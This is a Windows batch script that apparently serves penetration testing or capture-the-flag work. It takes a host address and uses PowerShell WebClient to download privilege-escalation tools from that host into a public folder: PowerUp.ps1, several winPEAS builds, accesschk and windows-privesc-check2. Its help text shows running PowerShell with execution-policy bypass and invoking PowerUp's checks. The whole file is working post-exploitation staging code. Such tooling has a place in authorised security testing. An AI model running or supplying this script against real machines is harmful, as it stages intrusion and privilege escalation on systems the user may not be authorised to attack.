@echo off

echo %%1 = %1
rmdir C:\Users\Public\script
mkdir C:\Users\Public\script
if "%1"== "" goto ERROR
if "%1"== "help" goto HELPTXT
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://%1/windows-script/accesschk.exe','C:\Users\Public\script\accesschk.exe')"
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://%1/windows-script/PowerUp.ps1','C:\Users\Public\script\PowerUp.ps1')"
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://%1/windows-script/windows-privesc-check2.exe','C:\Users\Public\script\windows-privesc-check2.exe')"
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://%1/windows-script/winPEASany.exe','C:\Users\Public\script\winPEASany.exe')"
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://%1/windows-script/winPEASx64.exe','C:\Users\Public\script\winPEASx64.exe')"
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://%1/windows-script/winPEASx86.exe','C:\Users\Public\script\winPEASx86.exe')"

exit /B

:ERROR
echo Hikisu_Nashi_Error
exit /B

:HELPTXT
echo "powershell -ep bypass"
echo ". .\powerup.ps"
echo "Invoke-AllChecks"

exit /B

